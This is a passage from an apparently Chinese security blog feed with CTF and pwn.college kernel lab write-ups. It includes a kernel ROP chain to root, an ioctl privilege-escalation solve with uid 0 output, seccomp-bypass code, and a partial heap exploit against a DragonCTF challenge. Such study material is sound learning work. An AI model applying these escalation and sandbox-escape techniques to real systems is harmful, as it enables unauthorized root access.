class="string">&quot;[*]core_base:%p\n&quot;</span>,core_base);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;[*]prepare_kernel_cred_addr:%p\n&quot;</span>,prepare_kernel_cred_addr);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;[*]commit_creds_addr:%p\n&quot;</span>,commit_creds_addr);</span><br><span class="line"> <span class="comment">//junk</span></span><br><span class="line"> <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">8</span>;i++)&#123;</span><br><span class="line">     rop[i] = <span class="number">0x66666666</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> rop[i++] = canary;                      <span class="comment">//canary</span></span><br><span class="line"> rop[i++] = <span class="number">0</span>;                           <span class="comment">//rbp(junk)</span></span><br><span class="line"> rop[i++] = vmlinux_base + <span class="number">0xb2f</span>;        <span class="comment">//pop_rdi_ret;</span></span><br><span class="line"> rop[i++] = <span class="number">0</span>;                           <span class="comment">//rdi</span></span><br><span class="line"> rop[i++] = prepare_kernel_cred_addr;</span><br><span class="line"> rop[i++] = vmlinux_base + <span class="number">0xa0f49</span>;      <span class="comment">//pop_rdx_ret</span></span><br><span class="line"> rop[i++] = vmlinux_base + <span class="number">0x21e53</span>;      <span class="comment">//pop_rcx_ret</span></span><br><span class="line"> rop[i++] = vmlinux_base + <span class="number">0x1aa6a</span>;      <span class="comment">//mov_rdi_rax_call_rdx</span></span><br><span class="line"> rop[i++] = commit_creds_addr;</span><br><span class="line"> rop[i++] = core_base + <span class="number">0xd6</span>;            <span class="comment">//swapgs_ret</span></span><br><span class="line"> rop[i++] = <span class="number">0</span>;                           <span class="comment">//rbp(junk)</span></span><br><span class="line"> rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line"> rop[i++] = (<span class="type">size_t</span>)shell;</span><br><span class="line"> rop[i++] = user_cs;</span><br><span class="line"> rop[i++] = user_eflags;</span><br><span class="line"> rop[i++] = user_sp;</span><br><span class="line"> rop[i++] = user_ss;</span><br><span class="line"> core_write(rop,<span class="number">0x100</span>);</span><br><span class="line"> core_copy_func(<span class="number">0xf000000000000100</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个pop_rcx_ret的原因是因为call指令的时候会把它的返回地址push入栈,这样会破坏我们的ROP链,所以要把它pop出去。和ret2usr很相似，都是基于栈溢出。这里唯一不同的地方就是执行<strong>代码没有直接使用用户空间的，而仍然是内核的</strong>(因为我们rop本质是在驱动里面运作，在内核态)</p><p>寻找gardet的方法如下</p><blockquote><p>ropper –file vmlinux  -search “pop|ret” (较慢)</p><p>objdump <code>-</code>d vmlinux <code>-</code>M intel | grep <code>-</code>E ‘ret|pop’(格式不好看，但是很快)</p></blockquote><p>主要找到上述类似gardet，可以模仿来做栈溢出等。</p>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel-1-basic_knowledge</title>
      <link href="/2022/01/23/kernel-1-basic_knowledge/"/>
      <url>/2022/01/23/kernel-1-basic_knowledge/</url>
      
        <content type="html"><![CDATA[<p>kernel基础环境+驱动编译+基础提权、沙箱绕过</p><p>参考链接<a href="https://pwn.college/modules/kernel">https://pwn.college/modules/kernel</a></p><span id="more"></span><h1 id="kernel-1"><a href="#kernel-1" class="headerlink" title="kernel-1"></a>kernel-1</h1><p>参考链接<a href="https://pwn.college/modules/kernel">https://pwn.college/modules/kernel</a></p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>这里可以说是遇到大坑了</p><p>尝试过的网站：</p><ol><li><a href="https://www.anquanke.com/post/id/85837">https://www.anquanke.com/post/id/85837</a> (失败)</li></ol><p>原因: kernel版本太老，编译器不支持</p><ol start="2"><li><a href="https://github.com/yuawn/Linux-Kernel-Exploitation">https://github.com/yuawn/Linux-Kernel-Exploitation</a> (可以成功，但是最后删掉了)</li></ol><p>但是由于网上的利用方法都基于<code>create_proc_entry</code>，这个网址的内核版本又比较高，不支持这个函数。就没有教程可以学，于是删掉了</p><ol start="3"><li>直接从pwn.college里面下载 <a href="https://pwn.college/modules/kernel">https://pwn.college/modules/kernel</a> （推荐）</li></ol><p>这个方法最简单，还有视频教程。本篇笔记就基于此。</p><h2 id="编译、运行驱动"><a href="#编译、运行驱动" class="headerlink" title="编译、运行驱动"></a>编译、运行驱动</h2><h3 id="安装和删除"><a href="#安装和删除" class="headerlink" title="安装和删除"></a>安装和删除</h3><p>可以在/src中编写自己驱动的.c版本，之后./build.sh再launch.sh就可以再kernel中看见刚才编写的模块了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod a.ko # 可以用来安装并运行一个编译好的内核模块</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsmod # 显示安装的模块</span><br><span class="line">rmmod # 删除模块</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/ # [    2.634357] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3</span><br><span class="line">ls</span><br><span class="line">bin                 hello_log.ko        proc</span><br><span class="line">dev                 hello_proc_char.ko  root</span><br><span class="line">etc                 home                sbin</span><br><span class="line">flag                init                sys</span><br><span class="line">hello_dev_char.ko   linuxrc             usr</span><br><span class="line">hello_ioctl.ko      make_root.ko</span><br><span class="line">/ # insmod hello_log.ko </span><br><span class="line">[   31.187734] hello_log: loading out-of-tree module taints kernel.</span><br><span class="line">[   31.193743] Hello pwn.college!</span><br><span class="line">/ # lsmod</span><br><span class="line">hello_log 16384 0 - Live 0xffffffffc0000000 (O)</span><br><span class="line">/ # rmmod hello_log.ko </span><br><span class="line">[   47.961254] Goodbye pwn.college!</span><br><span class="line">/ # </span><br></pre></td></tr></table></figure><h3 id="设备号"><a href="#设备号" class="headerlink" title="设备号"></a>设备号</h3><p>和在os中学过的知识一样，每一个设备都有一个设备号。这里安装了一个设备，能够打印出自己的设备号。首先看看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册设备对应读写函数</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">  .read = device_read,</span><br><span class="line">  .write = device_write,</span><br><span class="line">  .open = device_open,</span><br><span class="line">  .release = device_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设备初始化时打印一些参数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  major_number = register_chrdev(<span class="number">0</span>, <span class="string">&quot;pwn-college-char&quot;</span>, &amp;fops);  <span class="comment">// &lt;====这里的返回值就是设备号</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (major_number &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;Registering char device failed with %d\n&quot;</span>, major_number);</span><br><span class="line">    <span class="keyword">return</span> major_number;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;I was assigned major number %d.\n&quot;</span>, major_number);</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;Create device with: &#x27;mknod /dev/pwn-college-char c %d 0&#x27;.\n&quot;</span>, major_number);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ # insmod hello_dev_char.ko </span><br><span class="line">[  310.758676] I was assigned major number 248.</span><br><span class="line">[  310.759132] Create device with: &#x27;mknod /dev/pwn-college-char c 248 0&#x27;.</span><br></pre></td></tr></table></figure><h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h3><p>本质是和设备交互的函数。可以往设备里面写控制编号等等。也是一个比较危险的，经常被恶意利用的函数。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>本质上要做的，是在process controlblock里面把uid设置成0，也就获得了os权限。</p><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p>cred：记录了进程的一些属性，包含特权级等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(<span class="keyword">struct</span> cred *); <span class="comment">// 替换原有的cred</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> cred * <span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *reference_task_struct)</span>; <span class="comment">// 如果传递参数为NULL，将得到一个root的cred</span></span><br></pre></td></tr></table></figure><p>我们的目的是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line"><span class="comment">// 就像用户态的system(/bin/sh)一样</span></span><br></pre></td></tr></table></figure><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>在/src/make_root.c中，有个重要函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">device_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> ioctl_num, <span class="type">unsigned</span> <span class="type">long</span> ioctl_param)</span></span><br><span class="line">&#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;Got ioctl argument %d!&quot;</span>, ioctl_num);</span><br><span class="line">        <span class="keyword">if</span> (ioctl_num == PWN)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">if</span> (ioctl_param == <span class="number">0x13371337</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;Granting root access!&quot;</span>);</span><br><span class="line">      commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));  <span class="comment">// &lt;======= function to get root privilige</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ioctl_param == <span class="number">0x31337</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;Escaping seccomp!&quot;</span>);</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;FLAGS BEFORE: %lx&quot;</span>, current-&gt;thread_info.flags);</span><br><span class="line">    current-&gt;thread_info.flags &amp;= ~_TIF_SECCOMP;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;FLAGS AFTER: %lx&quot;</span>, current-&gt;thread_info.flags);</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这相当于，我们只要控制了变量ioctl_param就能成功提权。</p><p>在pwn-college中，只需要<code>su - ctf</code>就可以切换到原本虚拟的的文件系统中。使用静态编译我们写的如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/pwn-college-root&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;before uid: %d\n&quot;</span>, getuid());</span><br><span class="line">    ioctl(fd,<span class="number">0x7001</span>,<span class="number">0x13371337</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after uid: %d\n&quot;</span>, getuid());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o attack -static make_root_solve.c</span><br></pre></td></tr></table></figure><p>之后运行，就可以拿到一个root权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~/Desktop/kernel/pwnkernel/src $ ./attack </span><br><span class="line">[ 1780.024894] Device opened.</span><br><span class="line">[ 1780.029412] Got ioctl argument 28673!</span><br><span class="line">before uid: 1000</span><br><span class="line">after uid: 0  # &lt;======   grant superuser!</span><br><span class="line">[ 1780.029791] Granting root access!</span><br><span class="line">[ 1780.032075] Device closed.</span><br><span class="line">[ 1780.035175] attack (89) used greatest stack depth: 14080 bytes left</span><br><span class="line">~/Desktop/kernel/pwnkernel/src $ </span><br></pre></td></tr></table></figure><h2 id="如何寻找commit-creds"><a href="#如何寻找commit-creds" class="headerlink" title="如何寻找commit_creds"></a>如何寻找commit_creds</h2><ol><li>直接寻找符号</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span>/proc/kallsyms   <span class="comment"># 可以打印出内核所有符号地址，包括函数</span></span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /proc/kallsyms | grep <span class="string">&#x27;commit_creds&#x27;</span></span></span><br><span class="line">ffffffff810842b0 T commit_creds</span><br></pre></td></tr></table></figure><ol start="2"><li>在关闭ASLR或者古老版本的内核中，上述函数地址是可以预测的</li><li>调试</li><li>泄露，和用户态一样</li></ol><h2 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h2><p>sandbox和seccomp密切相关。我们首先看看他在那里实现。事实上还是在之前的process control block里面。flags中有一个比特指示是否开启了seccomp</p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">// LOTS of stuff, including</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;    <span class="comment">/* low level flags */</span></span><br><span class="line">    u32 status;        <span class="comment">/* thread synchronous flags */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// flags is a bit field that, among many other things, holds a bit named TIF_SECCOMP</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是实现seccomp的主函数在<code>secure computing</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Reference:</span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/latest/source/include/linux/seccomp.h#L43 </span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">secure_computing</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (unlikely(test_thread_flag(TIF_SECCOMP)))  &lt;==== 检查flag位</span><br><span class="line">        <span class="keyword">return</span>  __secure_computing(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __secure_computing(<span class="type">const</span> <span class="keyword">struct</span> seccomp_data *sd)<span class="comment">// 主要的实现函数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// lots of stuff, then...</span></span><br><span class="line"></span><br><span class="line">    this_syscall = sd ? sd-&gt;nr : syscall_get_nr(current, task_pt_regs(current));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (mode) &#123;</span><br><span class="line">        <span class="keyword">case</span> SECCOMP_MODE_STRICT:</span><br><span class="line">            __secure_computing_strict(this_syscall);  <span class="comment">/* may call do_exit */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> SECCOMP_MODE_FILTER:</span><br><span class="line">            <span class="keyword">return</span> __seccomp_filter(this_syscall, sd, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            BUG();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>可想而知，绕过的方法还是集中在PCB中，我们只需要把flag位与上相反的比特即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">current_task_struct-&gt;thread_info.flags &amp;= ~(<span class="number">1</span> &lt;&lt; TIF_SECCOMP)</span><br></pre></td></tr></table></figure><h3 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h3><p>依然使用之前的make_root.c，其中也包含了seccomp。和之前提权一样，只需要发送响应ioctf代码即可(如果开启了seccomp)</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上内容包含编译内核、编写驱动、运行驱动；提权和沙箱绕过两个基本操作。未涉及漏洞利用。以上大约为基础知识介绍。</p>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Drangonctf2021-noflippidy</title>
      <link href="/2022/01/22/Drangonctf2021-noflippidy/"/>
      <url>/2022/01/22/Drangonctf2021-noflippidy/</url>
      
        <content type="html"><![CDATA[<p>来自Drangonctf2021的noflippidy，patch了之前的flippidy中的flip函数，但还是可以攻击</p><span id="more"></span><h1 id="no-flippidy"><a href="#no-flippidy" class="headerlink" title="no-flippidy"></a>no-flippidy</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先发现是libc_2.27_2.4的libc，这样tcache double free就没有了，因此之前flippidy的洞也就不能用了。然后到这里，我也就没什么思路了。</p><p>参考了superguesser的wp，学到了新的方法。链接<a href="https://kileak.github.io/ctf/2021/dragoncf21-noflippidy/">https://kileak.github.io/ctf/2021/dragoncf21-noflippidy/</a></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="heap的mmap"><a href="#heap的mmap" class="headerlink" title="heap的mmap"></a>heap的mmap</h3><p>我们只能做极少的事情，在这里只能add堆块，算是很严苛了。superGuesser给出了一个新的glibc特性：当分配一个很大的堆块时，会直接mmap一块虚拟地址空间出来，而这一块<strong>和libc有固定偏移</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x3fe000           0x400000 rw-p     2000 0      /home/nicholas/Desktop/pwn/dragon/no_flippy/no_flippidy</span><br><span class="line">          0x400000           0x401000 r--p     1000 2000   /home/nicholas/Desktop/pwn/dragon/no_flippy/no_flippidy</span><br><span class="line">          0x401000           0x402000 r-xp     1000 3000   /home/nicholas/Desktop/pwn/dragon/no_flippy/no_flippidy</span><br><span class="line">          0x402000           0x403000 r--p     1000 4000   /home/nicholas/Desktop/pwn/dragon/no_flippy/no_flippidy</span><br><span class="line">          0x403000           0x404000 r--p     1000 4000   /home/nicholas/Desktop/pwn/dragon/no_flippy/no_flippidy</span><br><span class="line">          0x404000           0x405000 rw-p     1000 5000   /home/nicholas/Desktop/pwn/dragon/no_flippy/no_flippidy</span><br><span class="line">         0x13ed000          0x140e000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7efe4ff80000     0x7efe50181000 rw-p   201000 0      anon_7efe4ff80  &lt;==== our mmaped heap</span><br><span class="line">    0x7efe50181000     0x7efe50368000 r-xp   1e7000 0      /home/nicholas/glibc-all-in-one/libs/libc6_2.27-3ubuntu1.4_amd64/libc.so.6</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来我们分配notes，其实就是在libc中做修改。我们只要尝试分配到free_hook就可以了。</p><h3 id="dl-fini利用"><a href="#dl-fini利用" class="headerlink" title="dl_fini利用"></a>dl_fini利用</h3><p>这个是以前听说过的一种利用，最早在pwnable上面看到过。现在难得见到了可以学习的题目。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">void_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;  </span><br><span class="line">          ...</span><br><span class="line">          </span><br><span class="line">          _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">                         <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line">          </span><br><span class="line">          ...</span><br><span class="line"></span><br><span class="line">          <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line">              <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">                &#123;</span><br><span class="line">                  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line">                  </span><br><span class="line">                  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span> || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                    &#123;                      </span><br><span class="line">                      <span class="comment">/* First see whether an array is given. */</span></span><br><span class="line">                      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                          ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">                          </span><br><span class="line">                          <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                                            / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">                            ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="comment">/* Next try the old-style destructor. */</span></span><br><span class="line">                      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                        DL_CALL_DT_FINI (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">                    &#125;</span><br><span class="line">            ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般是两种利用方法</p><ol><li>改写<code>(fini_t) array[i]</code>，这样后面就会调用这个函数</li><li>改写<code>DL_CALL_DT_FINI (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr)</code>往里面存地址，这样也会调用函数</li></ol><p>可以这道题没有给出使用fini的做法。</p><h2 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;__free_hook</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (void (**)(void *, const void *)) 0x7f49a29db8e8 &lt;__free_hook&gt;</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p 0x7f49a29db8e8-0x7f49a23ed000</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 6220008</span></span><br></pre></td></tr></table></figure><p>之后计算(6220008/0x40)得到我们想要覆盖到free_hook的偏移。但是事先要泄露一个堆地址或者libc地址。superguesser尝试了这么做，但是发现能够泄露，泄露之后无法再次调用。</p><p>这里采用了一种伪造堆块的方法。如下图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x0</span>) + p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(<span class="number">0x404000</span>)            &lt;= points above menu_ptrs</span><br><span class="line"></span><br><span class="line">add((<span class="number">0x5ecc60</span>-<span class="number">0x10</span>)/<span class="number">8</span>, payload)     &lt;= offset to <span class="number">0x40</span> fastbin main_arena</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/20gx 0x7f49a29d9c60-0x20</span></span><br><span class="line">0x7f49a29d9c40 &lt;main_arena&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f49a29d9c50 &lt;main_arena+16&gt;: 0x0000000000000000      0x0000000000000000  </span><br><span class="line">0x7f49a29d9c60 &lt;main_arena+32&gt;: 0x0000000000000000      